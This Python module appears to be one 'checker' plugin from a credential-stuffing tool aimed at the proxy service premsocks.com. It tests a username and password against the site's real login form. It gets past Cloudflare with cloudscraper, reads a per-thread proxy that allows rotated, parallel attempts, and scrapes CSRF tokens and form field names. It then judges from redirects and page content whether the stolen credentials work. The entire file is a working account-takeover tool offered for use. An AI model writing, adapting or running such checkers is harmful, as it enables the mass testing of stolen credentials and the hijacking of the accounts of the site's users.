"""
Checker for Premsocks (premsocks.com)
Uses traditional form-based login with Cloudflare bypass.
"""
import re
import threading
from typing import Tuple
from urllib.parse import urljoin

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

BASE_URL = "https://premsocks.com"
LOGIN_URL = BASE_URL + "/login"
TIMEOUT = 20

def check(username: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    if HAS_CLOUDSCRAPER:
        session = cloudscraper.create_scraper()
    else:
        import requests
        session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": LOGIN_URL,
    })

    try:
        # Step 1: GET login page to extract CSRF token and hidden fields
        resp = session.get(LOGIN_URL, timeout=TIMEOUT)
        if resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp.status_code})"

        html = resp.text

        # Find the form action
        form_action = LOGIN_URL
        match = re.search(r'<form[^>]*action="([^"]+)"', html, re.I)
        if match:
            action = match.group(1)
            if action.startswith("/"):
                form_action = urljoin(BASE_URL, action)
            elif action.startswith("http"):
                form_action = action

        # Extract hidden inputs
        payload = {}
        hidden_pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"'
        for name, value in re.findall(hidden_pattern, html, re.I):
            payload[name] = value

        # Also extract CSRF token from meta or script
        token_match = re.search(r'<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"', html, re.I)
        if token_match:
            payload["_token"] = token_match.group(1)
        else:
            # Try common CSRF field names
            for name in ["csrf_token", "authenticity_token", "csrf"]:
                if name in payload:
                    break

        # Determine field names for username and password
        username_field = None
        password_field = None
        input_pattern = r'<input[^>]*name="([^"]+)"[^>]*type="([^"]+)"'
        for name, typ in re.findall(input_pattern, html, re.I):
            if typ in ["text", "email"] and ("user" in name.lower() or "email" in name.lower()):
                username_field = name
            elif typ == "password" and "password" in name.lower():
                password_field = name

        if not username_field:
            username_field = "username"
        if not password_field:
            password_field = "password"

        payload[username_field] = username
        payload[password_field] = password

        # Step 2: POST credentials
        post_resp = session.post(form_action, data=payload, allow_redirects=True, timeout=TIMEOUT)

        # Step 3: Determine success
        final_url = post_resp.url.lower()
        html = post_resp.text.lower()

        # Success: redirected to dashboard or non-login page
        if "login" not in final_url and "register" not in final_url:
            return True, "Login successful (redirected to dashboard)"

        # Check for error messages in the page
        if "invalid" in html or "incorrect" in html or "wrong" in html:
            return False, "Invalid credentials"

        # If we are still on the login page with no error, check for logout link
        if "logout" in html:
            return True, "Login successful"

        # If the page contains the login form again, it's a failure
        if 'name="username"' in html or 'name="password"' in html:
            return False, "Login failed – still on login page"

        # If we're on a page that says "Login" but has no form, maybe success
        if "login" in final_url and "register" not in final_url:
            if len(post_resp.text) > 5000:  # dashboard pages tend to be larger
                return True, "Login successful (dashboard content detected)"

        return False, "Login failed – unknown response"

    except Exception as e:
        return False, f"Request error: {str(e)}"